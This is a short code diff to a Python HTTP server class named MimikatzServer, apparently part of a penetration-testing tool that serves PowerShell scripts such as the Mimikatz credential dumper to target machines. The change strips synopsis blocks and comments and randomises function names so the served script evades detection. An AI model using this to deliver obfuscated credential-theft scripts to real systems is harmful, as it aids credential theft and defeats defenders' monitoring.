@@ -11,6 +11,7 @@ import ssl
 
 func_name = re.compile('CHANGE_ME_HERE')
 comments  = re.compile('#.+')
+synopsis  = re.compile('<#.+#>')
 
 class MimikatzServer(BaseHTTPRequestHandler):
 
@@ -23,8 +24,10 @@ class MimikatzServer(BaseHTTPRequestHandler):
             self.end_headers()
             with open('hosted/'+ self.path[4:], 'rb') as script:
                 ps_script = script.read()
-                ps_script = func_name.sub(settings.args.obfs_func_name, ps_script)
-                ps_script = comments.sub('', ps_script)
+                ps_script = eval(synopsis.sub('', repr(ps_script))) #Removes the synopsys
+                ps_script = func_name.sub(settings.args.obfs_func_name, ps_script) #Randomizes the function name
+                ps_script = comments.sub('', ps_script) #Removes the comments
+                #logging.info('Sending the following modified powershell script: {}'.format(ps_script))
                 self.wfile.write(ps_script)
 
         elif settings.args.path:
